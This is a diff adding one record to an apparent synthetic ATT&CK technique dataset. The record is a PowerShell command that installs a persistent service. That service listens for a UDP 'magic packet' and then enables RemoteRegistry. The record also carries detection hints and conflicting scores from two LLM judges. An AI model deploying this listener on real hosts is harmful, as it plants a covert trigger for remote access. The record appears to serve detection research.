@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $script = @'$udp = New-Object System.Net.Sockets.UdpClient(44444)\n$ep = New-Object System.Net.IPEndPoint([IPAddress]::Any,0)\n$data = $udp.Receive([ref]$ep)\n$msg = [Text.Encoding]::ASCII.GetString($data)\nif($msg -eq ''START:RemoteRegistry''){ Set-Service -Name ''RemoteRegistry'' -StartupType Automatic; Start-Service -Name ''RemoteRegistry'' }\n$udp.Close()\n'@; $path='C:\\ProgramData\\knock-listener.ps1'; Set-Content -Path $path -Value $script -Encoding ASCII; New-Service -Name 'KnockListener' -BinaryPathName \"powershell.exe -ExecutionPolicy Bypass -File `\"$path`\"\" -StartupType Automatic -Description 'Listens for UDP magic packet to enable service'; Start-Service -Name 'KnockListener' }",
+  "explanation": "Creates and starts a Windows service that listens for a UDP magic string 'START:RemoteRegistry' to enable and start the RemoteRegistry service, exemplifying traffic signaling to activate functionality. Detection: alert on creation of new services that run PowerShell, UDP bindings on high ports, and unexpected changes to RemoteRegistry startup type. Requires Administrator privileges; UAC elevation required for New-Service.",
+  "rationale_steps": [
+    "Deploy a persistent knock listener via New-Service.",
+    "On receiving a magic packet, enable and start a disabled service.",
+    "Provide detections for new services and service configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-b8e603f0",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "The outer PowerShell command is largely well-formed with balanced braces and quoting, but the here-string\u2019s closing '@' sharing a line and the doubled single quotes inside the here-string introduce minor risks.",
+        "semantic_score": 3,
+        "semantic_justification": "It conceptually implements Traffic Signaling by creating a service that listens for a UDP magic string to trigger RemoteRegistry, but the saved script contains malformed string literals (''...''), and the operation requires admin privileges, making successful execution unlikely as written.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:37:25.439013Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes and braces, correctly escaped paths for the service binary, and PowerShell's implicit string concatenation handling the `''string''` literals without errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by creating a Windows service that listens for a specific UDP magic string, using it as a signal to enable and start the RemoteRegistry service, directly exemplifying the T1205 Traffic Signaling technique to activate functionality.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:37:48.412257Z"
+      }
+    ],
+    "llm_average_syntactic": 4.5,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
